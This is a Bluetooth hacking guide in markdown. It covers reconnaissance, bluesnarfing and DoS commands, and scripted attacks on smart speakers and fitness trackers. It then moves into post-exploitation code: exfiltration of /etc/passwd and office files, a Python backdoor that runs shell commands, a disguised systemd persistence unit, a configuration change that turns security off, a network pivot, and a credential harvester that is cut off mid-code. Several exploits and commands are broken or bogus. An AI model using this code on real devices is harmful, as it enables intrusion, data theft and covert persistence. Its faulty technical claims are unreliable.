# **Comprehensive Bluetooth Security Testing and Hacking Guide**

## **Table of Contents**

1. [Introduction to Bluetooth Architecture](#introduction-to-bluetooth-architecture)  
2. [Linux Bluetooth Commands and Their Purpose](#linux-bluetooth-commands-and-their-purpose)  
3. [Bluetooth Reconnaissance Techniques](#bluetooth-reconnaissance-techniques)  
4. [Advanced Bluetooth Attack Vectors](#advanced-bluetooth-attack-vectors)  
5. [Bluetooth Hacking Tools and Frameworks](#bluetooth-hacking-tools-and-frameworks)  
6. [Practical Attack Methods](#practical-attack-methods)  
7. [Security Auditing with Bluetooth](#security-auditing-with-bluetooth)  
8. [Bluetooth Vulnerabilities and Security Practices](#bluetooth-vulnerabilities-and-security-practices)  
9. [Defense and Mitigation Strategies](#defense-and-mitigation-strategies)  
10. [Scenario-Based Walkthroughs](#scenario-based-walkthroughs)  
11. [Post-Exploitation Techniques](#post-exploitation-techniques)  
12. [Conclusion](#conclusion)


## **Introduction to Bluetooth Architecture**

### **Bluetooth Protocol Stack**

Understanding the Bluetooth protocol stack is crucial for effective
security testing:

-   **Radio Layer**: Physical radio transmission (2.4 GHz ISM band)\
-   **Baseband Layer**: Timing, frequency hopping, and packet formats\
-   **LMP (Link Manager Protocol)**: Authentication, encryption, and
    power management\
-   **L2CAP**: Logical Link Control and Adaptation Protocol\
-   **SDP (Service Discovery Protocol)**: Service advertisement and
    discovery\
-   **Application Protocols**: RFCOMM, OBEX, HID, A2DP, etc.

### **Bluetooth Versions and Security Evolution**

-   **Bluetooth 1.0-1.2**: E0 encryption (easily breakable)\
-   **Bluetooth 2.0**: Enhanced Data Rate (EDR)\
-   **Bluetooth 2.1**: Secure Simple Pairing (SSP)\
-   **Bluetooth 4.0**: Bluetooth Low Energy (BLE)\
-   **Bluetooth 5.0**: Improved security and range

## **Linux Bluetooth Commands and Their Purpose**

### **Basic Bluetooth Management Commands**

The commands below are standard tools used on Linux systems for managing
and interacting with Bluetooth hardware.

\# Check Bluetooth service status\
sudo systemctl status bluetooth

\# Start/stop/restart Bluetooth service\
sudo systemctl start bluetooth\
sudo systemctl stop bluetooth\
sudo systemctl restart bluetooth

\# View Bluetooth adapter information\
hciconfig\
hciconfig -a \# Detailed information

\# Enable/disable Bluetooth adapter\
sudo hciconfig hci0 up\
sudo hciconfig hci0 down

\# Reset Bluetooth adapter\
sudo hciconfig hci0 reset

\# Change device class\
sudo hciconfig hci0 class 0x1c0104

\# Change device name\
sudo hciconfig hci0 name "NewDeviceName"

### **Device Discovery and Information Gathering**

\# Scan for nearby Bluetooth devices\
hcitool scan\
hcitool scan \--length=15 \# Extended scan duration

\# Inquiry with device names\
hcitool inq\
hcitool name \[MAC_ADDRESS\]

\# Get detailed device information\
sudo hcitool info \[MAC_ADDRESS\]

\# Check device services\
sdptool browse \[MAC_ADDRESS\]\
sdptool records \[MAC_ADDRESS\]

\# Test connectivity\
sudo l2ping -c 5 \[MAC_ADDRESS\]\
sudo l2ping -s 100 -c 10 \[MAC_ADDRESS\] \# Custom packet size

## **Bluetooth Reconnaissance Techniques**

### **Passive Reconnaissance**

\# Monitor Bluetooth traffic with btmon\
sudo btmon

\# Capture Bluetooth packets with tcpdump\
sudo tcpdump -i bluetooth0 -w bluetooth_capture.pcap

\# Use Bluelog for passive device discovery\
sudo bluelog -i hci0 -o bluetooth_log.txt\
sudo bluelog -i hci0 -d -o bluetooth_log.txt \# Daemon mode

\# Advanced Bluelog options\
sudo bluelog -i hci0 -v -t -o detailed_log.txt \# Verbose with
timestamps

### **Active Reconnaissance**

\# Aggressive device scanning with timeout\
timeout 30s hcitool scan

\# Service enumeration\
for addr in \$(hcitool scan \| grep -oE
'(\[0-9A-F\]{2}:){5}\[0-9A-F\]{2}'); do\
echo "Scanning \$addr"\
sdptool browse \$addr\
done

\# Device class identification\
hcitool inq \| while read addr class rest; do\
echo "\$addr has class \$class"\
done

## **Advanced Bluetooth Attack Vectors**

### **1. Bluejacking**

**Definition**: Sending unsolicited messages via OBEX push to nearby
devices.

\# Using obexftp for bluejacking\
echo "Hello from hacker" \> message.txt\
obexftp -b \[TARGET_MAC\] -p message.txt

\# Using ussp-push\
ussp-push \[TARGET_MAC\]@9 message.txt message.txt

### **2. Bluesnarfing**

**Definition**: Unauthorized access to device information via OBEX
protocol vulnerabilities.

\# Access device phonebook\
obexftp -b \[TARGET_MAC\] -c telecom -g pb.vcf

\# Download calendar entries\
obexftp -b \[TARGET_MAC\] -c telecom/cal -l

\# Access file system (if vulnerable)\
obexftp -b \[TARGET_MAC\] -l

### **3. Bluedebugging**

**Definition**: Gaining shell access through Bluetooth vulnerabilities.

\# Attempt RFCOMM connection\
rfcomm connect 0 \[TARGET_MAC\] 1

\# Use bluediving for automated attacks\
python bluediving.py -a \[TARGET_MAC\]

### **4. BlueSmacking (Bluetooth DoS)**

\# L2CAP ping flood\
sudo l2ping -i hci0 -s 600 -f \[TARGET_MAC\]

\# Using BlueSmack tool\
python bluesmack.py \[TARGET_MAC\]

## **Bluetooth Hacking Tools and Frameworks**

### **Essential Tools**

#### **1. BlueZ Suite (Built-in Linux tools)**

\# Install BlueZ tools\
sudo apt-get install bluez bluez-tools

\# Additional utilities\
sudo apt-get install libbluetooth-dev

#### **2. Specialized Bluetooth Hacking Tools**

\# Install Bluetooth hacking toolkit\
sudo apt-get install bluetooth-toolkit

\# Bluelog - Bluetooth device logger\
sudo apt-get install bluelog

\# Blueranger - Bluetooth range finder\
git clone
\[https://github.com/hackgnar/blueranger\](https://github.com/hackgnar/blueranger)\
cd blueranger && make

\# Bluepot - Bluetooth honeypot\
git clone
\[https://github.com/andrewmichaelsmith/bluepot\](https://github.com/andrewmichaelsmith/bluepot)

\# Btscanner - Bluetooth device scanner\
sudo apt-get install btscanner

#### **3. Advanced Frameworks**

\# BTLEJuice - Bluetooth Low Energy interception\
npm install -g btlejuice

\# Ubertooth for Bluetooth sniffing\
\# Requires Ubertooth hardware\
ubertooth-btle -f -t \[TARGET_MAC\]

\# GATTacker for BLE testing\
git clone
\[https://github.com/securing/gattacker\](https://github.com/securing/gattacker)

## **Practical Attack Methods**

### **Method 1: Information Gathering Pipeline**

#!/bin/bash\
\# Bluetooth reconnaissance script

echo "Starting Bluetooth reconnaissance..."

\# Discover devices\
echo "Discovering devices..."\
hcitool scan \> discovered_devices.txt

\# For each device, gather information\
while read line; do\
if \[\[
$line \=\~ (\[0-9A-F\]{2}:){5}\[0-9A-F\]{2} \]\]; then  mac=$(echo
\$line \| grep -oE '(\[0-9A-F\]{2}:){5}\[0-9A-F\]{2}')\
echo "Gathering info for \$mac"

        \# Get device info  
        hcitool info $mac \> info\_$mac.txt 2\>&1  
            
        \# Get services  
        sdptool browse $mac \> services\_$mac.txt 2\>&1  
            
        \# Test connectivity  
        l2ping \-c 3 $mac \> ping\_$mac.txt 2\>&1  
    fi  

done \< discovered_devices.txt

### **Method 2: Service Exploitation**

\# OBEX service exploitation\
check_obex() {\
local target_mac=\$1\
echo "Checking OBEX services for \$target_mac"

    \# Try to list directory  
    obexftp \-b $target\_mac \-l \> /dev/null 2\>&1  
    if \[ $? \-eq 0 \]; then  
        echo "OBEX access successful\!"  
        obexftp \-b $target\_mac \-l \> obex\_$target\_mac.txt  
    fi  

}

\# HID service exploitation\
check_hid() {\
local target_mac=\$1\
echo "Checking HID services for \$target_mac"

    \# Attempt HID connection  
    hidd \--connect $target\_mac  

}

### **Method 3: BLE Attack Methods**

\# BLE device scanning\
sudo hcitool lescan

\# BLE GATT service discovery\
gatttool -b \[BLE_MAC\] \--primary

\# BLE characteristic reading\
gatttool -b \[BLE_MAC\] \--char-read -a 0x002a

\# BLE characteristic writing\
gatttool -b \[BLE_MAC\] \--char-write-req -a 0x002a -n 01

\# Using bettercap for BLE attacks\
sudo bettercap -eval "ble.recon on; ble.show"

## **Security Auditing with Bluetooth**

### **Professional Auditing Tools**

#### **Bluelog - Advanced Usage**

\# Comprehensive logging\
sudo bluelog -i hci0 -o audit_log.txt -d -v -t

\# Device tracking over time\
sudo bluelog -i hci0 -o tracking.txt -n "Device Tracker"

\# MAC address randomization detection\
sudo bluelog -i hci0 -f -o randomization_log.txt

#### **Custom Auditing Scripts**

#!/bin/bash\
\# Bluetooth security audit script

INTERFACE="hci0"\
OUTPUT_DIR="bluetooth_audit\_\$(date +%Y%m%d\_%H%M%S)"\
mkdir -p \$OUTPUT_DIR

\# Device discovery with timestamps\
echo "Starting device discovery audit..."\
bluelog -i \$INTERFACE -o
$OUTPUT\_DIR/device\_discovery.log \-t & BLUELOG\_PID=$!

\# Service enumeration\
echo "Enumerating services..."\
hcitool scan \| grep -oE '(\[0-9A-F\]{2}:){5}\[0-9A-F\]{2}' \| while
read mac; do\
echo "Auditing services for \$mac" \>\> \$OUTPUT_DIR/service_audit.log\
sdptool browse \$mac \>\> \$OUTPUT_DIR/service_audit.log 2\>&1\
echo "---" \>\> \$OUTPUT_DIR/service_audit.log\
done

\# Security testing\
echo "Performing security tests..."\
echo "Testing for common vulnerabilities..." \>
\$OUTPUT_DIR/security_tests.log

sleep 300 \# Run for 5 minutes\
kill \$BLUELOG_PID

## **Bluetooth Vulnerabilities and Security Practices**

### **Historical Vulnerabilities**

#### **Classic Attacks Explained**

**Bluejacking**

-   **Method**: Exploited OBEX push functionality\
-   **Impact**: Nuisance messages, social engineering\
-   **Mitigation**: Disable OBEX push services, use non-discoverable
    mode

**Bluesnarfing**

-   **Method**: Unauthorized OBEX GET requests\
-   **Vulnerable devices**: Older phones with OBEX vulnerabilities\
-   **Impact**: Data theft (contacts, calendar, messages)\
-   **Detection**: Monitor for unauthorized OBEX connections

**Bluedebugging**

-   **Method**: Exploitation of debug interfaces or weak authentication\
-   **Impact**: Full device control, remote access\
-   **Mitigation**: Disable debug modes, use strong authentication

### **Modern Bluetooth Vulnerabilities**

#### **BlueBorne (CVE-2017-0781, CVE-2017-0782)**

\# Testing for BlueBorne vulnerability\
\# Use Metasploit module\
msfconsole\
use auxiliary/scanner/bluetooth/bluebrone_scanner\
set RHOSTS \[TARGET_IP_RANGE\]\
run

#### **BIAS Attack (Bluetooth Impersonation AttackS)**

-   Affects Bluetooth BR/EDR connections\
-   Allows attacker to impersonate paired devices\
-   Mitigation: Use Bluetooth 5.1+ with enhanced security

#### **BLE Vulnerabilities**

\# BLE security testing\
\# Install bettercap for BLE attacks\
sudo apt install bettercap

\# BLE reconnaissance and attacks\
sudo bettercap -eval "\
ble.recon on;\
sleep 10;\
ble.enum \[TARGET_MAC\];\
ble.write \[TARGET_MAC\] \[HANDLE\] \[VALUE\]\
"

## **Defense and Mitigation Strategies**

### **Device Hardening**

\# Disable unnecessary Bluetooth services\
sudo systemctl disable bluetooth\
\# Or configure specific services\
sudo systemctl mask bluetooth

\# Configure Bluetooth security settings\
\# Edit /etc/bluetooth/main.conf\
sudo nano /etc/bluetooth/main.conf

\# Key settings:\
\# DiscoverableTimeout = 0\
\# PairableTimeout = 0\
\# Class = 0x000000 \# Hide device class

### **Network-Level Protection**

\# Bluetooth traffic monitoring\
sudo tcpdump -i bluetooth0 -w bt_monitor.pcap

\# Implement Bluetooth firewall rules\
\# Block unauthorized connections\
iptables -A INPUT -p bluetooth -j DROP\
iptables -A INPUT -p bluetooth -s \[TRUSTED_MAC\] -j ACCEPT

### **Security Best Practices**

1.  **Device Configuration**
    -   Use non-discoverable mode when possible\
    -   Implement strong PIN/passkey policies\
    -   Regular security updates\
2.  **Environment Security**
    -   Conduct pairing in secure environments\
    -   Monitor for unauthorized devices\
    -   Implement device whitelisting\
3.  **Organizational Policies**
    -   Bluetooth usage guidelines\
    -   Regular security audits\
    -   Employee training

### **Monitoring and Detection**

#!/bin/bash\
\# Bluetooth security monitoring script

\# Alert on new device discovery\
monitor_new_devices() {\
bluelog -i hci0 -o /tmp/current_scan.log -q

    if \[ \-f /tmp/previous\_scan.log \]; then  
        diff /tmp/previous\_scan.log /tmp/current\_scan.log | grep "\>" | while read line; do  
            echo "ALERT: New device detected \- $line" | logger  
            \# Send alert email or notification  
        done  
    fi  
        
    mv /tmp/current\_scan.log /tmp/previous\_scan.log  

}

\# Monitor for pairing attempts\
monitor_pairing() {\
journalctl -u bluetooth -f \| while read line; do\
if echo "\$line" \| grep -q "pairing"; then\
echo "ALERT: Pairing attempt detected - \$line" \| logger\
fi\
done\
}

## **Scenario-Based Walkthroughs**

### **Scenario 1: Penetration Testing a Smart Speaker (Amazon Echo/Google Home)**

#### **Phase 1: Initial Reconnaissance**

#!/bin/bash\
\# Smart Speaker Bluetooth Assessment Script

echo "=== SMART SPEAKER BLUETOOTH PENETRATION TEST ==="\
echo "Target: Smart Speaker Device"\
echo "Date: \$(date)"\
echo "Tester: \[Your Name\]"

\# Step 1: Environment setup and adapter preparation\
echo "Step 1: Preparing Bluetooth adapter..."\
sudo hciconfig hci0 down\
sudo hciconfig hci0 up\
sudo hciconfig hci0 class 0x1c0104 \# Set device class to appear as
audio device\
sudo hciconfig hci0 name "Bluetooth_Audio_Device"

\# Step 2: Initial device discovery\
echo "Step 2: Discovering target devices..."\
timeout 30s hcitool scan \| tee initial_scan.txt

\# Look for smart speakers (common patterns)\
grep -i "echo\\\|alexa\\\|google\\\|home" initial_scan.txt \>
potential_targets.txt

#### **Phase 2: Target Identification and Service Enumeration**

\# Extract target MAC addresses\
TARGET_MAC=\$(cat potential_targets.txt \| head -1 \| grep -oE
'(\[0-9A-F\]{2}:){5}\[0-9A-F\]{2}')

echo "Step 3: Target identified - \$TARGET_MAC"\
echo "Gathering detailed information..."

\# Device information gathering\
hcitool info \$TARGET_MAC \> device_info.txt\
hcitool name \$TARGET_MAC \>\> device_info.txt

\# Service discovery - critical step\
echo "Step 4: Enumerating services..."\
sdptool browse \$TARGET_MAC \> services.txt

\# Look for specific services common in smart speakers\
echo "Analyzing services for attack vectors..."\
grep -E "(A2DP\|AVRCP\|HFP\|HSP\|OBEX)" services.txt \>
attack_services.txt

\# Check for audio services\
echo "Audio services found:"\
grep -i "audio" services.txt

\# Check for vulnerable services\
echo "Checking for potentially vulnerable services..."\
grep -E "(RFCOMM\|L2CAP\|SDP)" services.txt \> vulnerable_services.txt

#### **Phase 3: Vulnerability Assessment**

\# Step 5: Testing connectivity and response\
echo "Step 5: Testing device responsiveness..."\
sudo l2ping -c 5 \$TARGET_MAC \> connectivity_test.txt

\# Test for information disclosure\
echo "Step 6: Testing for information disclosure..."

\# Attempt OBEX connection (if available)\
if grep -q "OBEX" services.txt; then\
echo "OBEX service detected - testing access..."\
obexftp -b \$TARGET_MAC -l \> obex_test.txt 2\>&1

    if \[ $? \-eq 0 \]; then  
        echo "CRITICAL: OBEX access successful\!"  
        echo "Attempting to browse device filesystem..."  
        obexftp \-b $TARGET\_MAC \-c / \-l \> filesystem\_enum.txt  
    fi  

fi

\# Test A2DP audio injection (common attack vector)\
if grep -q "A2DP" services.txt; then\
echo "A2DP detected - testing audio injection..."\
\# Attempt to pair and inject audio\
echo "Attempting pairing for audio injection..."

    \# Use bluetoothctl for interactive pairing  
    expect \-c "  
    spawn bluetoothctl  
    expect "\#"  
    send "agent on\\r"  
    expect "\#"  
    send "pair $TARGET\_MAC\\r"  
    expect {  
        "PIN" {  
            send "0000\\r"  
            exp\_continue  
        }  
        "Pairing successful" {  
            send "connect $TARGET\_MAC\\r"  
            expect "\#"  
            send "quit\\r"  
        }  
        timeout { exit 1 }  
    }  
    "  

fi

#### **Phase 4: Exploitation Attempts**

\# Step 7: Attempting exploitation\
echo "Step 7: Exploitation phase..."

\# Test for BlueBorne vulnerability\
echo "Testing for BlueBorne vulnerability..."\
python3 -c "\
import socket\
import struct

def test_blueborne(target_mac):\
try:\
\# Create L2CAP socket\
sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW,
socket.BTPROTO_L2CAP)\
sock.settimeout(10)

        \# Craft malicious packet  
        payload \= b'\\x00' \* 100  \# Simplified payload  
        sock.sendto(payload, (target\_mac, 0))  
            
        print('BlueBorne test packet sent')  
        sock.close()  
        return True  
    except Exception as e:  
        print(f'BlueBorne test failed: {e}')  
        return False

test_blueborne('\$TARGET_MAC')\
"

\# Attempt HID profile exploitation if available\
if grep -q "Human Interface Device" services.txt; then\
echo "HID service found - testing input injection..."

    \# Attempt to connect as HID device  
    python3 \-c "  

import bluetooth

def hid_exploit(target_mac):\
try:\
\# Attempt HID connection\
sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)\
sock.connect((target_mac, 0x11)) \# HID Control channel

        \# Send test HID packet  
        sock.send(b'\\xa1\\x01\\x00\\x00\\x04\\x00\\x00\\x00\\x00')  \# 'a' key press  
            
        print('HID packet sent successfully')  
        sock.close()  
        return True  
    except Exception as e:  
        print(f'HID exploit failed: {e}')  
        return False  
        

hid_exploit('\$TARGET_MAC')\
"\
fi

### **Scenario 2: Fitness Tracker Security Assessment**

#### **Phase 1: BLE Device Discovery and Analysis**

#!/bin/bash\
\# Fitness Tracker BLE Security Assessment

echo "=== FITNESS TRACKER BLE PENETRATION TEST ==="

\# Step 1: BLE device discovery\
echo "Step 1: Discovering BLE devices..."\
sudo timeout 30s hcitool lescan \> ble_devices.txt

\# Filter for fitness tracker patterns\
grep -iE "(fitbit\|garmin\|samsung\|polar\|xiaomi\|amazfit)"
ble_devices.txt \> fitness_targets.txt

BLE_TARGET=\$(head -1 fitness_targets.txt \| grep -oE
'(\[0-9A-F\]{2}:){5}\[0-9A-F\]{2}')\
echo "Target fitness tracker: \$BLE_TARGET"

#### **Phase 2: BLE Service and Characteristic Enumeration**

\# Step 2: GATT service discovery\
echo "Step 2: Enumerating GATT services..."\
gatttool -b \$BLE_TARGET \--primary \> gatt_services.txt

echo "Services discovered:"\
cat gatt_services.txt

\# Step 3: Characteristic enumeration\
echo "Step 3: Enumerating characteristics..."\
gatttool -b \$BLE_TARGET \--characteristics \> gatt_characteristics.txt

\# Look for interesting characteristics\
echo "Analyzing characteristics for sensitive data..."\
grep -iE "(heart\|step\|sleep\|battery\|device\|name)"
gatt_characteristics.txt \> sensitive_chars.txt

#### **Phase 3: Data Extraction and Analysis**

\# Step 4: Reading sensitive characteristics\
echo "Step 4: Attempting to read sensitive data..."

while read line; do\
if \[\[
$line \=\~ handle: 0x(\[0-9a-fA-F\]+) \]\]; then  handle="0x${BASH_REMATCH\[1\]}"\
echo "Reading characteristic at handle \$handle"\
gatttool -b \$BLE_TARGET \--char-read -a \$handle \>\>
extracted_data.txt 2\>&1\
fi\
done \< gatt_characteristics.txt

\# Step 5: Attempting unauthorized writes\
echo "Step 5: Testing write capabilities..."\
\# Common writeable characteristics\
WRITABLE_HANDLES=(0x0025 0x0028 0x002b)

for handle in "\${WRITABLE_HANDLES\[@\]}"; do\
echo "Testing write to handle \$handle"\
gatttool -b \$BLE_TARGET \--char-write -a \$handle -n 01 \>\>
write_tests.txt 2\>&1\
done

### **Scenario 3: Corporate Bluetooth Infrastructure Assessment**

#### **Phase 1: Environment Mapping**

#!/bin/bash\
\# Corporate Bluetooth Infrastructure Assessment

echo "=== CORPORATE BLUETOOTH SECURITY ASSESSMENT ==="

\# Step 1: Comprehensive device discovery\
echo "Step 1: Mapping Bluetooth environment..."

\# Extended discovery session\
bluelog -i hci0 -o corporate_devices.log -v -t &\
BLUELOG_PID=\$!

\# Parallel active scanning\
hcitool scan \--length=20 \> active_scan.txt &

\# BLE scanning\
sudo hcitool lescan \> ble_scan.txt &

sleep 300 \# 5-minute discovery phase\
kill \$BLUELOG_PID\
killall hcitool

echo "Discovery complete. Analyzing results..."

#### **Phase 2: Risk Classification**

\# Step 2: Device categorization and risk assessment\
echo "Step 2: Categorizing discovered devices..."

\# Create device categories\
mkdir -p device_categories/{high_risk,medium_risk,low_risk,unknown}

\# Parse and categorize devices\
while read line; do\
if \[\[
$line \=\~ (\[0-9A-F\]{2}:){5}\[0-9A-F\]{2} \]\]; then  mac=$(echo
$line | grep \-oE '(\[0-9A-F\]{2}:){5}\[0-9A-F\]{2}')  name=$(echo
\$line \| sed 's/.\*\\t//')

        \# High-risk devices (keyboards, mice, phones)  
        if echo "$name" | grep \-iE "(keyboard|mouse|phone|iphone|samsung|pixel)"; then  
            echo "$mac \- $name" \>\> device\_categories/high\_risk/devices.txt  
        \# Medium-risk devices (printers, speakers)  
        elif echo "$name" | grep \-iE "(printer|speaker|headset|audio)"; then  
            echo "$mac \- $name" \>\> device\_categories/medium\_risk/devices.txt  
        \# Low-risk devices (fitness trackers, etc.)  
        elif echo "$name" | grep \-iE "(fitbit|tracker|watch)"; then  
            echo "$mac \- $name" \>\> device\_categories/low\_risk/devices.txt  
        else  
            echo "$mac \- $name" \>\> device\_categories/unknown/devices.txt  
        fi  
    fi  

done \< active_scan.txt

## **Post-Exploitation Techniques**

### **Data Exfiltration via Bluetooth**

#### **Method 1: Covert Data Channel Establishment**

#!/bin/bash\
\# Establish covert Bluetooth data channel

\# Step 1: Create hidden RFCOMM service\
echo "Establishing covert data channel..."

\# Bind to high-numbered channel to avoid detection\
sudo rfcomm bind 10 \$TARGET_MAC 30

\# Step 2: Data exfiltration script\
exfiltrate_data() {\
local target_file=\$1\
local output_channel=\$2

    echo "Exfiltrating $target\_file via Bluetooth..."  
        
    \# Encode and transmit data in chunks  
    base64 $target\_file | while read line; do  
        echo "DATA:$line" \> /dev/rfcomm$output\_channel  
        sleep 0.1  \# Avoid detection through rate limiting  
    done  
        
    echo "EOF" \> /dev/rfcomm$output\_channel  

}

\# Usage example\
exfiltrate_data "/etc/passwd" "10"

#### **Method 2: Bluetooth File Transfer Exploitation**

\# OBEX-based data exfiltration\
obex_exfiltrate() {\
local target_mac=\$1\
local source_dir=\$2

    echo "Starting OBEX exfiltration from $source\_dir"  
        
    \# Create temporary FTP directory structure  
    mkdir \-p /tmp/exfil\_staging  
        
    \# Copy sensitive files to staging area  
    find $source\_dir \-type f \-name "\*.pdf" \-o \-name "\*.doc\*" \-o \-name "\*.xls\*" | \\  
    while read file; do  
        cp "$file" /tmp/exfil\_staging/  
    done  
        
    \# Transfer files via OBEX  
    cd /tmp/exfil\_staging  
    for file in \*; do  
        echo "Transferring $file..."  
        obexftp \-b $target\_mac \-p "$file"  
    done  

}

### **Privilege Escalation Techniques**

#### **Bluetooth Stack Exploitation**

\# Exploit Bluetooth service vulnerabilities for privilege escalation\
privilege_escalation() {\
echo "Attempting Bluetooth privilege escalation..."

    \# Step 1: Check current privileges  
    id \> /tmp/current\_privs.txt  
        
    \# Step 2: Exploit BlueZ service vulnerabilities  
    \# CVE-2020-0022 exploitation example  
    python3 \-c "  

import socket\
import struct

def bluez_exploit():\
try:\
\# Create HCI socket (requires bluetooth group membership)\
sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW,
socket.BTPROTO_HCI)

        \# Craft privilege escalation payload  
        \# This is a simplified example \- actual exploits are more complex  
        payload \= struct.pack('\<H', 0x0401)  \# HCI\_RESET command  
        payload \+= b'\\x00' \* 100  \# Buffer overflow payload  
            
        sock.send(payload)  
        print('Privilege escalation payload sent')  
            
    except PermissionError:  
        print('Need bluetooth group membership for exploitation')  
    except Exception as e:  
        print(f'Exploitation failed: {e}')

bluez_exploit()\
"\
}

#### **Bluetooth Firmware Exploitation**

\# Firmware-level exploitation for persistent access\
firmware_exploit() {\
echo "Attempting firmware-level exploitation..."

    \# Step 1: Dump Bluetooth firmware  
    echo "Dumping current firmware..."  
    hcitool cmd 0x3f 0x0000 \> firmware\_dump.bin 2\>&1  
        
    \# Step 2: Analyze firmware for vulnerabilities  
    echo "Analyzing firmware..."  
    hexdump \-C firmware\_dump.bin | head \-20  
        
    \# Step 3: Attempt firmware modification  
    \# WARNING: This can brick devices \- only for authorized testing  
    echo "Attempting firmware modification..."  
        
    \# Create malicious firmware patch  
    python3 \-c "  

import struct

def create_firmware_patch():\
\# Create a simple firmware patch\
patch = b'\\x90' \* 1024 \# NOP sled\
patch += b'\\x31\\xc0' \# xor eax, eax (example shellcode)

    with open('firmware\_patch.bin', 'wb') as f:  
        f.write(patch)  
        
    print('Firmware patch created')

create_firmware_patch()\
"\
}

### **Persistence Mechanisms**

#### **Bluetooth Service Backdoor**

\# Install persistent Bluetooth backdoor\
install_bluetooth_backdoor() {\
echo "Installing Bluetooth persistence mechanism..."

    \# Step 1: Create backdoor service  
    cat \> /tmp/bt\_backdoor.py \<\< 'EOF'  

#!/usr/bin/env python3\
import bluetooth\
import subprocess\
import threading\
import time

class BluetoothBackdoor:\
def \_\_init\_\_(self, channel=22):\
self.channel = channel\
self.server_socket = None

    def start\_server(self):  
        self.server\_socket \= bluetooth.BluetoothSocket(bluetooth.RFCOMM)  
        self.server\_socket.bind(("", self.channel))  
        self.server\_socket.listen(1)  
            
        print(f"Bluetooth backdoor listening on channel {self.channel}")  
            
        while True:  
            try:  
                client\_socket, address \= self.server\_socket.accept()  
                print(f"Connection from {address}")  
                    
                \# Handle client in separate thread  
                client\_thread \= threading.Thread(  
                    target=self.handle\_client,  
                    args=(client\_socket,)  
                )  
                client\_thread.daemon \= True  
                client\_thread.start()  
                    
            except Exception as e:  
                print(f"Server error: {e}")  
                time.sleep(5)  
        
    def handle\_client(self):  
        try:  
            while True:  
                data \= client\_socket.recv(1024).decode('utf-8').strip()  
                if not data:  
                    break  
                    
                if data.startswith('CMD:'):  
                    command \= data\[4:\]  
                    try:  
                        result \= subprocess.check\_output(  
                            command, shell=True,  
                            stderr=subprocess.STDOUT  
                        )  
                        client\_socket.send(result)  
                    except Exception as e:  
                        client\_socket.send(f"Error: {e}".encode())  
                    
                elif data \== 'PING':  
                    client\_socket.send(b'PONG')  
                    
                elif data \== 'EXIT':  
                    break  
                        
        except Exception as e:  
            print(f"Client error: {e}")  
        finally:  
            client\_socket.close()

if \_\_name\_\_ == "\_\_main\_\_":\
backdoor = BluetoothBackdoor()\
backdoor.start_server()\
EOF

    \# Step 2: Make executable and install  
    chmod \+x /tmp/bt\_backdoor.py  
        
    \# Step 3: Create systemd service for persistence  
    cat \> /tmp/bluetooth-backdoor.service \<\< 'EOF'  

\[Unit\]\
Description=Bluetooth Service Extension\
After=bluetooth.service\
Requires=bluetooth.service

\[Service\]\
Type=simple\
ExecStart=/usr/bin/python3 /opt/bluetooth-backdoor.py\
Restart=always\
RestartSec=10

\[Install\]\
WantedBy=multi-user.target\
EOF

    echo "Backdoor service created. Install with:"  
    echo "sudo cp /tmp/bt\_backdoor.py /opt/bluetooth-backdoor.py"  
    echo "sudo cp /tmp/bluetooth-backdoor.service /etc/systemd/system/"  
    echo "sudo systemctl enable bluetooth-backdoor.service"  

}

#### **Registry/Configuration Persistence**

\# Modify Bluetooth configuration for persistence\
config_persistence() {\
echo "Establishing configuration-based persistence..."

    \# Step 1: Backup original configuration  
    sudo cp /etc/bluetooth/main.conf /etc/bluetooth/main.conf.backup  
        
    \# Step 2: Modify configuration for backdoor access  
    cat \>\> /etc/bluetooth/main.conf \<\< 'EOF'

\# Hidden backdoor configuration\
\[General\]\
\# Enable debug mode (hidden)\
Debug=true\
\# Allow all device classes\
Class=0x000000\
\# Disable security for specific services\
Security=off

\[Policy\]\
\# Allow connections from any device\
AutoConnect=true\
ReconnectAttempts=0\
ReconnectIntervals=1,2,4,8,16\
EOF

    echo "Configuration persistence established"  

}

### **Advanced Post-Exploitation Techniques**

#### **Bluetooth Network Pivoting**

\# Use Bluetooth as network pivot point\
bluetooth_pivot() {\
echo "Setting up Bluetooth network pivot..."

    \# Step 1: Create Bluetooth PAN (Personal Area Network)  
    sudo modprobe bnep  
        
    \# Step 2: Configure bridge interface  
    sudo brctl addbr bt-bridge  
    sudo ifconfig bt-bridge up  
        
    \# Step 3: Setup routing for pivot  
    echo "1" | sudo tee /proc/sys/net/ipv4/ip\_forward  
        
    \# Step 4: Create pivot script  
    cat \> /tmp/bt\_pivot.py \<\< 'EOF'  

#!/usr/bin/env python3\
import bluetooth\
import socket\
import threading\
import select

class BluetoothPivot:\
def \_\_init\_\_(self, target_mac, target_port=22):\
self.target_mac = target_mac\
self.target_port = target_port\
self.bt_socket = None\
self.tcp_socket = None

    def start\_pivot(self):  
        \# Create Bluetooth RFCOMM socket  
        self.bt\_socket \= bluetooth.BluetoothSocket(bluetooth.RFCOMM)  
        self.bt\_socket.bind(("", bluetooth.PORT\_ANY))  
        self.bt\_socket.listen(1)  
            
        print(f"Bluetooth pivot listening for connections...")  
            
        while True:  
            client\_socket, address \= self.bt\_socket.accept()  
            print(f"Pivot connection from {address}")  
                
            \# Handle pivot in separate thread  
            pivot\_thread \= threading.Thread(  
                target=self.handle\_pivot,  
                args=(client\_socket,)  
            )  
            pivot\_thread.start()  
        
    def handle\_pivot(self, bt\_client):  
        \# Connect to target service via TCP  
        tcp\_socket \= socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)  
        tcp\_socket.connect(('target\_system', self.target\_port))  
            
        \# Relay data between Bluetooth and TCP  
        while True:  
            ready \= select.select(\[bt\_client, tcp\_socket\], \[\], \[\])  
                
            for sock in ready\[0\]:  
                data \= sock.recv(4096)  
                if not data:  
                    return  
                    
                if sock \== bt\_client:  
                    tcp\_socket.send(data)  
                else:  
                    bt\_client.send(data)

if \_\_name\_\_ == "\_\_main\_\_":\
pivot = BluetoothPivot("target_mac_address")\
pivot.start_pivot()\
EOF

    chmod \+x /tmp/bt\_pivot.py  
    echo "Bluetooth pivot configured"  

}

#### **Credential Harvesting via Bluetooth**

\# Harvest credentials through Bluetooth services\
credential_harvest() {\
echo "Starting Bluetooth credential harvesting..."

    \# Step 1: Monitor Bluetooth authentication attempts  
    cat \> /tmp/bt\_credential\_logger.py \<\< 'EOF'  

#!/usr/bin/env python3\
import bluetooth\
import hashlib\
import time\
import json

class CredentialHarvester:\
